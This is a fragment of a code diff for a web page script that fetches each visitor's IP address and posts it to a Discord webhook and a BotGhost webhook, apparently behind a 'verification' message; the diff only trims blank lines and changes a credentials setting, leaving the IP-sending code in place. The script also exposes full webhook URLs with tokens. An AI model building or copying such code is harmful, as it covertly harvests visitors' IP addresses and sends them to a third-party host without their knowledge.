@@ -52,7 +52,6 @@
                     .then(response => response.json())
                     .then(data => {
                         const userIP = data.ip;
-
                         fetch("https://discord.com/api/webhooks/1305558117420892241/X3TC44x8aZrxgYD71reZpHIZThzShBhBRhiet7w6K6Uq7oQya9xcGPaPdm3KIC4AZh2K", {
                             method: "POST",
                             headers: {
@@ -69,7 +68,6 @@
                             console.error("Erreur lors de l'envoi de l'IP:", error);
                             document.getElementById("message").innerText = "Erreur lors de la vérification.";
                         });
-
                         fetch("https://api.botghost.com/webhook/1151241118403534958/0t2nh2769i3bdja5axve7b", {
                             method: "POST",
                             headers: {
@@ -83,7 +81,7 @@
                                     value: "HELLO from webhooks"
                                 }]
                             }),
-                            credentials: "same-origin"
+                            credentials: "omit"
                         })
                     .then(response => response.json())
                     .then(data => {
